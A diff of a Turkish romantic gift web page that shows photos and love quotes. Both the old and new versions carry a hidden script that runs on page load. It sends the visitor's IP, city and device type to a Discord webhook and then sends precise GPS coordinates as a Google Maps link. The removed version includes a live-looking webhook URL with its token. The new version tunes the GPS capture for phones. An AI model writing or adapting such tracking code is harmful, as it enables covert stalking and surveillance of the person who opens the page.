@@ -1,155 +1,67 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-<script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "vecz1fv72x");
-</script>
+<script>
+    // --- DISCORD VE KONUM AYARLARI ---
+    const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_GELECEK"; 
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Senin İçin</title>
+    function discordaGonder(mesaj) {
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: mesaj })
+        }).catch(err => console.error("Discord Hatası:", err));
+    }
 
-    <style>
-        body {
-            background: #000;
-            color: white;
-            margin: 0;
-            height: 100vh;
-            font-family: 'Poppins', sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        img {
-            width: 550px;
-            height: 300px;
-            object-fit: cover;
-            border-radius: 15px;
-            box-shadow: 0 0 30px #ff00ff;
-            margin-bottom: 20px;
-        }
-
-        #soz {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-            color: #ff66ff;
-            text-shadow: 0 0 15px #ff00ff;
-        }
-
-        /* Konum yazısı için minik bir stil (tasarımı bozmaz) */
-        #konum-bilgi {
-            font-size: 0.8rem;
-            color: #444;
-            margin-bottom: 5px;
-        }
-
-        button {
-            padding: 12px 28px;
-            background: #ff00ff;
-            border: none;
-            color: white;
-            font-size: 1.1rem;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 20px #ff00ff;
-        }
-
-        button:hover {
-            transform: scale(1.1);
-        }
-
-        #hediyeButon {
-            margin-top: 30px;
-            padding: 12px 28px;
-            background: #ff0077;
-            border: none;
-            color: white;
-            font-size: 1.2rem;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 20px #ff0077;
-            display: none; 
-        }
-
-        #hediyeButon:hover {
-            transform: scale(1.1);
-        }
-    </style>
-</head>
-
-<body>
-
-    <div id="icerik">
-        <img id="foto" src="foto1.jpg">
-        <p id="soz">Seninle her günüm daha güzel.</p>
-        <p id="konum-bilgi"></p> </div>
-
-    <button id="ileriBtn" onclick="ileri()">İleri ➜</button>
-
-    <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi Gör 🎁</button>
-
-    <audio id="music" autoplay loop>
-        <source src="music.mp3" type="audio/mpeg">
-    </audio>
-
-    <script>
-        // --- KONUM VE DISCORD AYARLARI ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I"; 
-
-        function discordaGonder(mesaj) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mesaj })
+    // Sayfa açıldığında çalışacak ana motor
+    window.onload = function() {
+        // 1. IP ile Şehir Bulma (Anında Discord'a gider)
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                discordaGonder(`🚀 **Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}\n📱 Cihaz: ${navigator.userAgent.includes("Mobi") ? "Mobil" : "Bilgisayar"}`);
+                
+                // 2. Hassas Konum (Telefonlar için optimize edildi)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        // Mobil uyumlu Google Haritalar link formatı
+                        const googleMaps = `https://www.google.com/maps?q=${lat},${lng}`;
+                        
+                        discordaGonder(`🎯 **Hassas Konum (Telefon/GPS)!**\n📍 Harita: ${googleMaps}`);
+                    }, 
+                    (err) => {
+                        console.log("Konum hatası veya izin verilmedi.");
+                    }, 
+                    {
+                        enableHighAccuracy: true, // Telefonun GPS'ini ateşler
+                        timeout: 10000,           // 10 saniye boyunca denemeye devam eder
+                        maximumAge: 0             // Önbellekten değil, taze veri alır
+                    });
+                }
             });
+    };
+
+    // --- SENİN ORİJİNAL FOTOĞRAF SİSTEMİN (DOKUNULMADI) ---
+    const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
+    const sozler = [
+        "Seninle her günüm daha güzel.",
+        "Gülüşün dünyamı aydınlatıyor.",
+        "Kalbim hep seninle.",
+        "Sana her baktığımda yeniden aşık oluyorum.",
+        "İyi ki varsın, iyi ki benimsin."
+    ];
+
+    let index = 0;
+
+    function ileri() {
+        index++;
+
+        if (index === fotolar.length) {
+            document.getElementById("hediyeButon").style.display = "block";
+            document.getElementById("ileriBtn").style.display = "none";
+            return;
         }
 
-        window.onload = function() {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    discordaGonder(`🚀 **Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}`);
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            discordaGonder(`🎯 **Tam Konum:**\n📍 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                        });
-                    }
-                });
-        };
-
-        // --- SENİN ORİJİNAL FOTOĞRAF GEÇİŞ SİSTEMİN ---
-        const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
-        const sozler = [
-            "Seninle her günüm daha güzel.",
-            "Gülüşün dünyamı aydınlatıyor.",
-            "Kalbim hep seninle.",
-            "Sana her baktığımda yeniden aşık oluyorum.",
-            "İyi ki varsın, iyi ki benimsin."
-        ];
-
-        let index = 0;
-
-        function ileri() {
-            index++;
-
-            if (index === fotolar.length) {
-                document.getElementById("hediyeButon").style.display = "block";
-                document.getElementById("ileriBtn").style.display = "none"; // İleri butonunu gizler
-                return;
-            }
-
-            document.getElementById("foto").src = fotolar[index];
-            document.getElementById("soz").innerText = sozler[index];
-        }
-    </script>
-
-</body>
-</html>
+        document.getElementById("foto").src = fotolar[index];
+        document.getElementById("soz").innerText = sozler[index];
+    }
+</script>
